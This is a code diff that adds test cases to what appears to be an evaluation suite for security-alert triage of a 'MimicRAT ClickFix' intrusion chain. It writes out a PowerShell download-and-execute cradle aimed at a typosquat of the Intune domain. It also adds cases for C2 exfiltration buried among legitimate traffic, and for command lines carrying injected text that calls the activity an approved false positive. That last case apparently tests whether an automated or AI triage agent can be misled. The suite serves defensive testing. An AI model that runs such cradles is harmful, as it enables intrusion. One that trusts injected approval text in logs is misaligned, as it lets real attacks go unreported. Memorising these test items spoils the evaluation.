@@ -20,9 +20,13 @@ import {
   fpWorld,
   INTUNE_AGENT_PARENT,
   jumpBoxWorld,
+  LOOKALIKE_DOMAIN,
   tpWorld,
   withBenignActivity,
+  withBuriedC2,
   withCradle,
+  withInjectedApproval,
+  withLookalikeDestinations,
   withManagementDestinations,
   withoutChainParents,
 } from './worlds';
@@ -35,6 +39,8 @@ const JUMP_BOX_ID = 'mimicrat-clickfix.jump-box';
 
 const MANAGEMENT_CRADLE =
   'powershell.exe -w min -c "iex (irm \'https://manage.microsoft.com/ztd/update.ps1\')"';
+
+const LOOKALIKE_CRADLE = `powershell.exe -w min -c "iex (irm 'https://${LOOKALIKE_DOMAIN}/ztd/update.ps1')"`;
 
 const eventId = (runMarker: string, eventKey: string): string =>
   getChainIds(MIMICRAT_CHAIN, runMarker).eventId(eventKey);
@@ -347,5 +353,64 @@ export const MIMICRAT_EXAMPLES: readonly FpTpExample[] = [
     checks: { entityRole: 'neutral', processParent: 'neutral', networkDestination: 'neutral' },
     buildWorld: (runMarker) =>
       withoutEventCategory(withoutChainParents(tpWorld(runMarker, 'unknown')), 'network'),
+  },
+  {
+    id: 'mimicrat-clickfix.buried-c2',
+    situation: 'U6',
+    evidenceState: 'complete',
+    expectedOutcome: 'true_positive',
+    provenance: 'replay',
+    variant: {
+      kind: 'mutation',
+      of: TP_ID,
+      description:
+        'SCCM distribution point, no parents, management cradle; every destination is Microsoft management except the exfil POST to a bare IP',
+    },
+    checks: { entityRole: 'neutral', processParent: 'neutral', networkDestination: 'supports' },
+    buildWorld: (runMarker) =>
+      withBuriedC2(
+        withCradle(
+          withoutChainParents(tpWorld(runMarker, 'sccm_distribution_point')),
+          runMarker,
+          MANAGEMENT_CRADLE
+        ),
+        runMarker
+      ),
+  },
+  {
+    id: 'mimicrat-clickfix.lookalike-domain',
+    situation: 'U6',
+    evidenceState: 'complete',
+    expectedOutcome: 'true_positive',
+    provenance: 'replay',
+    variant: {
+      kind: 'mutation',
+      of: TP_ID,
+      description:
+        'SCCM distribution point, no parents; the cradle, the stage-2 download and the C2 go to a typosquat of the Intune domain',
+    },
+    checks: { entityRole: 'neutral', processParent: 'neutral', networkDestination: 'supports' },
+    buildWorld: (runMarker) =>
+      withLookalikeDestinations(
+        withCradle(
+          withoutChainParents(tpWorld(runMarker, 'sccm_distribution_point')),
+          runMarker,
+          LOOKALIKE_CRADLE
+        )
+      ),
+  },
+  {
+    id: 'mimicrat-clickfix.injected-approval',
+    situation: 'U6',
+    evidenceState: 'complete',
+    expectedOutcome: 'true_positive',
+    provenance: 'replay',
+    variant: {
+      kind: 'perturbation',
+      of: TP_ID,
+      description: 'command lines carry text calling the activity an approved false positive',
+    },
+    checks: { entityRole: 'supports', processParent: 'supports', networkDestination: 'supports' },
+    buildWorld: (runMarker) => withInjectedApproval(tpWorld(runMarker), runMarker),
   },
 ];
